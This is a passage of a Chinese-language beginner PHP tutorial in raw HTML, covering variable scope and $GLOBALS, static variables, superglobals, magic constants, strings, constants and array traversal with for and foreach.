class="string">&#x27;y&#x27;</span>]=<span class="variable">$GLOBALS</span>[<span class="string">&#x27;x&#x27;</span>]+<span class="variable">$GLOBALS</span>[<span class="string">&#x27;y&#x27;</span>];</span><br><span class="line"> &#125;</span><br><span class="line"> myTest();</span><br><span class="line"> <span class="built_in">echo</span> <span class="variable">$y</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong><br>不可在global 后写 $变量 = 值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">10</span>;</span><br><span class="line">$b = <span class="number">100</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">global</span> $a , $b;</span><br><span class="line">   <span class="keyword">echo</span> $a + $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//结果是不是显示出来了？</span></span><br><span class="line">test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br>1.通过$GLOBLAS来读取外部变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$one = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   $two = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">   $result = $two + $GLOBALS[<span class="string">&#x27;one&#x27;</span>];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> $result;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//你会发现结果变成了110</span></span><br><span class="line"><span class="keyword">echo</span> demo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>上例中：我们将函数体外的变量通过$GLOBALS拿到了函数体使用。所以，打破了函数外的变量不能在函数体内使用的限定。</p>
</blockquote>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>static 作用域：</strong></font>当一个函数完成时，它的所有变量通常都会被删除。然而，有时候您希望某个局部变量不要被删除。要做到这一点，请在您第一次声明变量时使用 static 关键字：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">myTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="built_in">static</span> $x=<span class="number">0</span>;</span><br><span class="line">     <span class="keyword">echo</span> $x;</span><br><span class="line">     $x++;</span><br><span class="line"> &#125;</span><br><span class="line"> myTest();</span><br><span class="line"> myTest();</span><br><span class="line"> myTest();</span><br><span class="line"> myTest();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br>2.通过$GLOBLAS，在函数内修改外部变量</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$hongniu</span> = <span class="string">&#x27;我是一个兵，来自老百姓&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">test</span></span>()&#123;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;执行了函数test哟&lt;br /&gt;&#x27;</span>;</span><br><span class="line">   //调用<span class="built_in">test</span>()函数，将通过<span class="variable">$GLOBALS</span>[<span class="string">&#x27;hongniu&#x27;</span>],把<span class="variable">$hongniu</span>的值改变掉</span><br><span class="line"></span><br><span class="line">   <span class="variable">$GLOBALS</span>[<span class="string">&#x27;hongniu&#x27;</span>] = <span class="string">&#x27;帮助别人很快乐&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line">//发现是不是输出的值变了呀？</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$hongniu</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>通过上例：我们发现通过$GLOBALS[‘hongniu’],把$hongniu的值改变掉，所以在最后输出$hongniu的时候，值发生了变化。</p>
</blockquote>
<p>&emsp;<br>3.通过$GLOBLAS，在函数内创建全局变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">   $GLOBALS[<span class="string">&#x27;que&#x27;</span>] = <span class="string">&#x27;提神喝茶更好哟&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;你调了一下函数hello&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hello();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $que;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>上例中，我们发现$que是不存在的，可以调用函数hello()后，在函数外部可以执行echo $que了，能够看到结果：提神喝茶更好。我们明白了，函数内声明的变量，通过$GLOBALS声明一个变量，也能够显示出来。</p>
</blockquote>
<p>&emsp;<br>下面的知识是【了解】级别，我们越来越少的使用这种方式来声明全局变量了。在函数内使用global关键词后面跟一个或多个变量，就把变量变为了全局变量，格式如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">10</span>;</span><br><span class="line">$b = <span class="number">100</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">global</span> $a , $b;</span><br><span class="line">   <span class="keyword">echo</span> $a + $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//结果是不是显示出来了？</span></span><br><span class="line">test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>4. PHP 全局变量 - 超全局变量：</strong></font><br>PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。在函数或方法中无需执行 global<br>$变量名; 就可以访问它们。</p>
<p><font color="#00B2EE"><strong>PHP 超级全局变量列表：</strong></font> &emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_superglobals.asp">PHP 全局变量 - 超全局变量</a>]</font><br><strong>$GLOBALS<br>$_SERVER<br>$_REQUEST<br>$_POST<br>$_GET<br>$_FILES<br>$_ENV<br>$_COOKIE<br>$_SESSION</strong><br></font></p>
<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>5. PHP 系统变量（魔术常量）：</strong></font><br>PHP 向它运行的任何脚本提供了大量的预定义常量。<br>不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。<br><font color="#00B2EE"><strong>有八个魔术常量它们的值随着它们在代码中的位置改变而改变。</strong></font><br></font> </p>
<p><a href="http://www.php.cn/code/159.html">使用方法参见</a></p>
<table>
<thead>
<tr>
<th align="center">常量符号</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">__LINE__</td>
<td>文件中的当前行号</td>
</tr>
<tr>
<td align="center">__FILE__</td>
<td>文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。自 PHP<br> 4.0.2 起，__FILE__ 总是包含一个绝对路径（如果是符号连接，则是解析后的绝对路<br>径），而在此之前的版本有时会包含一个相对路径。</td>
</tr>
<tr>
<td align="center">__DIR__</td>
<td>文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。它等价于 <br>dirname(__FILE__)。除非是根目录，否则目录中名不包括末尾的斜杠。（PHP 5.3.0<br>中新增）</td>
</tr>
<tr>
<td align="center">__FUNCTION__</td>
<td>函数名称（PHP 4.3.0 新加）。自PHP5起本常量返回该函数被定义时的名字（区分大小<br>写）。在 PHP 4 中该值总是小写字母的。</td>
</tr>
<tr>
<td align="center">__CLASS__</td>
<td>类的名称（PHP 4.3.0 新加）。自 PHP 5起本常量返回该类被定义时的名字（区分大小<br>写）</td>
</tr>
<tr>
<td align="center">__TRAIT__</td>
<td>Trait 的名字（PHP 5.4.0 新加）。自 PHP 5.4.0 起，PHP实现了代码复用的一个方法，<br>称为 traits。</td>
</tr>
<tr>
<td align="center">__METHOD__</td>
<td>类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）。</td>
</tr>
</tbody></table>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-3-PHP-数据类型"><a href="#1-3-PHP-数据类型" class="headerlink" title="1.3 PHP 数据类型"></a><font color="#3CB371" face="Comic sans MS">1.3 PHP 数据类型</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. PHP的数据类型包括以下几种：</strong></font><br><strong>Integer（整型）、String（字符串）、Float（浮点型）、Boolean（布尔型）、Array（数组）、Object（对象）、NULL（空值）</strong></p>
<p><font color="red"><strong>2. 查看变量数据类型：</strong></font><br><font color="#00B2EE"><strong>1. gettype(传入一个变量)</strong></font> 能够获得变量的类型<br><font color="#00B2EE"><strong>2. var_dump(传入一个变量)</strong></font>  输出变类型和值 （最常用）<br>var_dump()是一个函数。向括号()中间插入变量。这个函数，会打印出来数据类型，还会对应显示变量的长度和值。<br></font></p>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-4-PHP-字符串"><a href="#1-4-PHP-字符串" class="headerlink" title="1.4 PHP 字符串"></a><font color="#3CB371" face="Comic sans MS">1.4 PHP 字符串</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 字符串型可以用三种方法定义：</strong></font><strong>单引号形式</strong>、<strong>双引号形式</strong>和<strong>Heredoc结构</strong>形式。</p>
<p><font color="red"><strong>2.单、双引号嵌套使用时注意事项：</strong></font><br>1.若单引号嵌套单引号或者双引号嵌套双号时：里层(被嵌套)的引号要用“<font color="#FF7F00">&lt;/font&gt;”转义字符转义；<br>2.单引号嵌套双引号或者双引号嵌套单引号时：不需要用转义字符。</p>
<p><font color="red"><strong>3.当美元符<font color="#FF7F00">$</font>在引号里时的区别：</strong></font><br>1.在双引号里：当双引号里包含变量时，变量会双引号里的内容连在一起；<br>2.在单引号里：变量会被当做字符地输出，即“<font color="#FF7F00">**$**</font>”会被输出。<br></font></p>
<p><img data-src="https://i.loli.net/2019/02/13/5c6438a104ab9.png" alt="1"></p>
<p>&emsp;<br><font face="Comic sans MS"><font color="red">**4. Heredoc结构(&lt;&lt;&lt;)：**</font><br>2).然后在&lt;&lt;&lt;后面写上字符（建议英文大写字符）。如下例中的：ABC<br>3).然后换行写上任意想写的字符<br>4).写完后，顶行。在行最开始处，再写上&lt;&lt;&lt;后面的字符和分号。如下例中的：ABC;<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$dingjie</span> = &lt;&lt;&lt;ABC     //“=”和“&lt;&lt;&lt;”和“ABC”这三个标志符号</span><br><span class="line">这里是字符串的内容。</span><br><span class="line">ABC;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>5. PHP strlen()  函数：</strong></font><br>有时知道字符串值的长度是很有用的。<br><font color="#00B2EE"><strong>strlen()</strong></font> 函数返回字符串的长度（字符数）。<br><strong>注意：</strong>在UTF-8下 strlen  把<font color="#00B2EE"><strong>中文字符算成 3 个字节，英文，空格，符号占 1 个字节。</strong></font><br>&emsp;<br><font color="red"><strong>6. PHP strpos() 函数：</strong></font><br><font color="#00B2EE"><strong>strpos()</strong></font>函数用于在字符串内查找一个字符或一段指定的文本。<br>如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。<br>实例:下面的实例在字符串 “Hello world!” 中查找文本 “world”：<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> <span class="built_in">echo</span> strpos(<span class="string">&quot;Hello world!&quot;</span>,<span class="string">&quot;world&quot;</span>);</span><br><span class="line"> ?&gt;</span><br><span class="line">运行结果：6</span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p><font color="red"><strong>提示：</strong>在上面的实例中，字符串 “world” 的位置是 6。之所以是 6 而不是 7 的原因是，字符串中第一个字符的位置是 0，而不是 1。</font></p>
</blockquote>
</blockquote>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-5-PHP-常量"><a href="#1-5-PHP-常量" class="headerlink" title="1.5 PHP 常量"></a><font color="#3CB371" face="Comic sans MS">1.5 PHP 常量</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 自定义常量：</strong></font><br>(1) 常量是单个值的标识符（名称）。在脚本中无法改变该值。<br>(2) 有效的常量名以字符或下划线开头（常量名称前面没有 $ 符号）。<br>(3) 常量名可以小写，但是通常大写。<br>(4) 常量是全局的，常量在定义后，默认是全局变量，可以在整个运行的脚本的任何地方使用。</p>
<p><font color="red">定义方法：</font><br>如需设置常量，请使用 define() 函数 - 它使用三个参数：</p>
<ol>
<li>首个参数定义常量的名称</li>
<li>第二个参数定义常量的值</li>
<li>可选的第三个参数规定常量名是否对大小写敏感。默认是 false。</li>
</ol>
<p><font color="red"><strong>注意关于define和const定义的区别：</strong></font><br>可以用 define() 函数来定义常量。在 PHP 5.3.0 以后，可以使用 <font color="#00B2EE"><strong>const</strong></font>  关键字在类定义的外部定义常量，先前版本const 关键字只能在类（class）中使用。一个常量一旦被定义，就不能再改变或者取消定义。<br>常量只能包含标量数据（boolean，integer，float 和 string）。 可以定义 resource 常量，但应尽量避免，因为会造成不可预料的结果。<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">define定义方式：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="string">&quot;PII&quot;</span>;</span><br><span class="line">define(<span class="string">&quot;PI&quot;</span>,<span class="number">3.14</span>);define($p,<span class="number">3.14</span>);</span><br><span class="line">define($p,<span class="number">3.14</span>);</span><br><span class="line"><span class="keyword">echo</span> PI;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PII;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">3.14</span></span><br><span class="line"><span class="number">3.14</span></span><br></pre></td></tr></table></figure>

<p>&emsp;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">const定义方式：</span><br><span class="line">希望一个成员变量不被修改 例如圆周率 3.1415926</span><br><span class="line">定义：const 常量名=值; 没有$符</span><br><span class="line">访问：类名 ::常量名 或 接口名::常量名</span><br><span class="line"></span><br><span class="line">&lt;?php　　　　　　　　　　　　　　　　　　　　　　defined(<span class="string">&#x27;TEXT&#x27;</span>);检查一个名称的常量是否存在</span><br><span class="line"> class A&#123;</span><br><span class="line"> const TAX_RATE=0.08;</span><br><span class="line"> public <span class="keyword">function</span> payTax(<span class="variable">$var</span>)&#123;</span><br><span class="line"> <span class="built_in">return</span> <span class="variable">$var</span>*A::TAX_RATE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=new A();</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span>-&gt;payTax(200):</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>用法一：</strong></font>const用于类成员变量，一经定义不可修改，define用于全局常量，不可用于类成员变量的定义，const可在类中使用，define不能。<br><font color="#00B2EE"><strong>用法二：</strong></font>const定义的常量大小写敏感，而define可通过第三个参数(为TRUE表示大小写不敏感)来指定大小写是否敏感。在运行时定义一个常量。define(‘TXE’,100,TRUE);<br><font color="#00B2EE"><strong>用法三：</strong></font>const不能在条件语句中定义常量，而define函数可以。if($a&gt;10){define(‘LE’,’hello’);<br></font></p>
<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>2. 判定常量是否被定义：</strong></font><br>如果常量被重复定义以后，PHP解析器会发出“Constant XXX already defined”的警告，提醒我们该常量已经被定义过。那么，在团队开发，或代码量很大的情况下，我们如何去判定一个常量是否被定义呢？<br><font color="#00B2EE"><strong>defined()</strong></font>函数可以帮助我们判断一个常量是否已经定义，其语法格式为：<br><font color="red">bool defined(string constants_name)</font><br>它只有参数constant_name，指的是要获取常量的名称，若存在则返回布尔类型true，否则返回布尔类型false; （注：bool表示函数返回值类型为布尔类型）<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">define(<span class="string">&quot;PI1&quot;</span>,3.14);</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;PI1&quot;</span>;</span><br><span class="line"><span class="variable">$is1</span> = defined(<span class="variable">$p</span>);</span><br><span class="line"><span class="variable">$is2</span> = defined(<span class="string">&quot;PI2&quot;</span>);</span><br><span class="line">var_dump(<span class="variable">$is1</span>);</span><br><span class="line">var_dump(<span class="variable">$is2</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>


<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. PHP 全局变量 - 超全局变量：</strong></font><br>PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。在函数或方法中无需执行 global<br>$变量名; 就可以访问它们。</p>
<p><font color="#00B2EE"><strong>PHP 超级全局变量列表：</strong></font> &emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_superglobals.asp">PHP 全局变量 - 超全局变量</a>]</font><br><strong>$GLOBALS<br>$_SERVER<br>$_REQUEST<br>$_POST<br>$_GET<br>$_FILES<br>$_ENV<br>$_COOKIE<br>$_SESSION</strong><br></font></p>
<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>4. PHP 系统变量（魔术常量）：</strong></font><br>PHP 向它运行的任何脚本提供了大量的预定义常量。<br>不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。<br><font color="#00B2EE"><strong>有八个魔术常量它们的值随着它们在代码中的位置改变而改变。</strong></font><br></font> </p>
<p><a href="http://www.php.cn/code/159.html">使用方法参见</a></p>
<table>
<thead>
<tr>
<th align="center">常量符号</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">__LINE__</td>
<td>文件中的当前行号</td>
</tr>
<tr>
<td align="center">__FILE__</td>
<td>文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。自 PHP<br> 4.0.2 起，__FILE__ 总是包含一个绝对路径（如果是符号连接，则是解析后的绝对路<br>径），而在此之前的版本有时会包含一个相对路径。</td>
</tr>
<tr>
<td align="center">__DIR__</td>
<td>文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。它等价于 <br>dirname(__FILE__)。除非是根目录，否则目录中名不包括末尾的斜杠。（PHP 5.3.0<br>中新增）</td>
</tr>
<tr>
<td align="center">__FUNCTION__</td>
<td>函数名称（PHP 4.3.0 新加）。自PHP5起本常量返回该函数被定义时的名字（区分大小<br>写）。在 PHP 4 中该值总是小写字母的。</td>
</tr>
<tr>
<td align="center">__CLASS__</td>
<td>类的名称（PHP 4.3.0 新加）。自 PHP 5起本常量返回该类被定义时的名字（区分大小<br>写）</td>
</tr>
<tr>
<td align="center">__TRAIT__</td>
<td>Trait 的名字（PHP 5.4.0 新加）。自 PHP 5.4.0 起，PHP实现了代码复用的一个方法，<br>称为 traits。</td>
</tr>
<tr>
<td align="center">__METHOD__</td>
<td>类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）。</td>
</tr>
</tbody></table>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-6-PHP数组：索引数组、关联数组"><a href="#1-6-PHP数组：索引数组、关联数组" class="headerlink" title="1.6 PHP数组：索引数组、关联数组"></a><font color="#3CB371" face="Comic sans MS">1.6 PHP数组：索引数组、关联数组</font></h4><p><font face="Comic sans MS">数组可以存入多个不同类型的数据，是一个复合数据类型。<br>我们可以使用<font color="red"><strong>array()</strong></font> 来初始化数组，每个数组元素之间使用逗号分隔  ,在PHP5.4版本之后，数组的初始化更为简洁，用中括号<font color="red">**[ ]**</font> 来初始化。<br>数组的格式：$shuzu=array(key=&gt;value)<br>key：键值  &emsp; value：键值对应值</p>
<p><font color="red"><strong>1. 索引数组：键值为整形（int）</strong></font><br><strong>我们来总结规律：</strong><br><font color="#00B2EE"><strong>1.</strong></font>索引数组若不强制声明他的下标，他的下标是从0开始的。（我们的第一个数组的值：只有不断努力才能博得未来。这个值的下标为0）。<br><font color="#00B2EE"><strong>2.</strong></font>如果我指定过下标他的下标就为我指定的值。如下标为5,10和下标为19的，都是我指定过的值。<br><font color="#00B2EE"><strong>3.</strong></font>若某个值（如php.cn），强制指定了下标（下标为10）。在它后面加上的值（PHP学院），不指定下标的话。他们的下标增长规律为最大值+1。<br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);    //设置编码</span><br><span class="line"> <span class="variable">$array</span>=array(100,1.34,<span class="literal">true</span>,<span class="string">&quot;PHP中文网&quot;</span>,);</span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"> var_dump(<span class="variable">$array</span>);</span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&#x27;&lt;pre/&gt;&#x27;</span>;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>2. 关联数组：键值中只要有一个为字符串（String）类型即称为关联数组）</strong></font><br>那我们来声明一下关联数组。跟索引数组的声明方式完成一样。不过不同的是，必须要指定字符串的下标和必须要使用键值对应符。<br>我们通过实验知道：<br><font color="#00B2EE"><strong>1.</strong></font>声明关联数组是 键名 =&gt; 值。<br><font color="#00B2EE"><strong>2.</strong></font>在关联数组可以有索引数组的元素。<br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> <span class="variable">$arr</span>=[            //用[ ]创建数组</span><br><span class="line">     <span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;Tom&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;age&#x27;</span>=&gt;<span class="string">&#x27;18&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;gender&#x27;</span>=&gt;<span class="string">&#x27;male&#x27;</span></span><br><span class="line"> ];</span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"> var_dump(<span class="variable">$arr</span>) ;</span><br><span class="line"> <span class="built_in">echo</span><span class="string">&quot;&lt;/pre&gt;&quot;</span></span><br><span class="line"> ?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：array(3) &#123;</span><br><span class="line">  [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">  string(3) <span class="string">&quot;Tom&quot;</span></span><br><span class="line">  [<span class="string">&quot;age&quot;</span>]=&gt;</span><br><span class="line">  string(2) <span class="string">&quot;18&quot;</span></span><br><span class="line">  [<span class="string">&quot;gender&quot;</span>]=&gt;</span><br><span class="line">  string(4) <span class="string">&quot;male&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p><font color="red"><strong>注：</strong></font>上例中<font color="red"><strong>echo pre</strong></font>这个标签的主要目的是为原样输出，格式展示的更好看，更清晰。</p>
</blockquote>
</blockquote>
<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. 索引数组和关联数组遍历分别用for和foreach</strong></font><br><font color="#00B2EE"><strong>1. 索引数组：使用for遍历</strong></font><br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> <span class="variable">$arr</span>=Array(<span class="string">&#x27;tom&#x27;</span>,<span class="string">&#x27;andy&#x27;</span>,<span class="string">&#x27;jack&#x27;</span>);</span><br><span class="line"> <span class="variable">$arrlength</span>=count(<span class="variable">$arr</span>);</span><br><span class="line"> <span class="keyword">for</span>(<span class="variable">$x</span>=0;<span class="variable">$x</span>&lt;<span class="variable">$arrlength</span>;<span class="variable">$x</span>++)&#123;</span><br><span class="line">     <span class="built_in">echo</span> <span class="variable">$arr</span>[<span class="variable">$x</span>];</span><br><span class="line">     <span class="built_in">echo</span>  <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"> &#125; </span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><br><font color="#00B2EE"><strong>2. 关联数组：使用foreach遍历</strong></font><br>foreach的基本语法：<br>有一个布尔型循环是专门用来循环数组的。这个循环的基本语法就是foreach基本语法</p>
<p><font color="#FF7F00">foreach( 要循环的数组变量 as [键变量 =&gt;] 值变量)<br>{<br>    //循环的内容<br>}<br></font><br>这是一个固定用法，将要循环的数组放进去。<br>as 是一个固定的关键字；<br>后面的键变量是可选的，随意定义一个变量，每次循环的时候，foreach这个语法会把键取出来赋值到键变量里面；<br>后面的值变量是必填的。每次循环的时候，会把值放到值变量里面。<br>我们下面用代码来举例子，加强对这个语法的理解。<br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> <span class="variable">$arr</span>=[</span><br><span class="line">     <span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;Tom&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;age&#x27;</span>=&gt;<span class="string">&#x27;18&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;gender&#x27;</span>=&gt;<span class="string">&#x27;male&#x27;</span></span><br><span class="line"> ];</span><br><span class="line"> foreach(<span class="variable">$arr</span> as <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">     <span class="built_in">echo</span> <span class="variable">$key</span>.<span class="string">&quot;: &quot;</span>.<span class="variable">$value</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"> &#125;;</span><br><span class="line">?&gt;</span><br><span class="line">运行结果：</span><br><span class="line">name: Tom</span><br><span class="line">age: 18</span><br><span class="line">gender: male</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>通过上面的运行结果我们得出下面的结果：</strong></font><br>1.每次循环的时候，把下标赋值给了变量$key，把值的变量赋值给了变量$value<br>2.循环一次读一次键和值。读到最后，发现没有可以读取的数组元素后，停止循环遍历数据。<br><strong>注意：</strong>$key 和$value并不是变量名必须得为这两个名字。你命名为其他的也可以，如 $kai =&gt; $wen是一样的。 你要清楚键赋值给了哪个变量，值赋值给了另外的哪个变量。</p>
<p><font color="#00B2EE"><strong>3. 通过foreach遍历不连续的索引数组，如下例：</strong></font><br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);    //设置编码</span><br><span class="line"> <span class="variable">$data</span> = array(</span><br><span class="line">     0 =&gt; <span class="string">&#x27;中国&#x27;</span>,</span><br><span class="line">     100 =&gt; <span class="string">&#x27;美国&#x27;</span>,</span><br><span class="line">     20 =&gt; <span class="string">&#x27;韩国&#x27;</span>,</span><br><span class="line">     300 =&gt; <span class="string">&#x27;德国&#x27;</span>,</span><br><span class="line"> ); </span><br><span class="line"> foreach(<span class="variable">$data</span> as <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">     <span class="built_in">echo</span> <span class="variable">$k</span> . <span class="string">&#x27;------&#x27;</span> . <span class="variable">$v</span> .<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br><span class="line">运行结果：</span><br><span class="line">0------中国</span><br><span class="line">100------美国</span><br><span class="line">20------韩国</span><br><span class="line">300------德国</span><br></pre></td></tr></table></figure>

<p><font face="Comic sans MS">按照foreach的结果推理与刚刚做的关联数组的结果是一样的。<br>不同的是不连续的索引数组。每读一次数组的元素，将当次循环的下标赋值给了变量$k，值赋值给了变量$v。<font color="red"><strong>（即不像for循环一样的循环遍历）</strong></font> 每读将键和值输出，然后显示出来。循环一次向后移动一次下标。读取至最后，退出执行。<br></font></p>
<p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>4. foreach遍历遍历多维数组：</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$data = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">       <span class="number">0</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">           <span class="string">&#x27;中国&#x27;</span> =&gt; <span class="string">&#x27;china&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;美国&#x27;</span> =&gt; <span class="string">&#x27;usa&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;德国&#x27;</span> =&gt; <span class="string">&#x27; Germany&#x27;</span>,</span><br><span class="line">       ),</span><br><span class="line"></span><br><span class="line">       <span class="number">1</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">           <span class="string">&#x27;湖北&#x27;</span> =&gt; <span 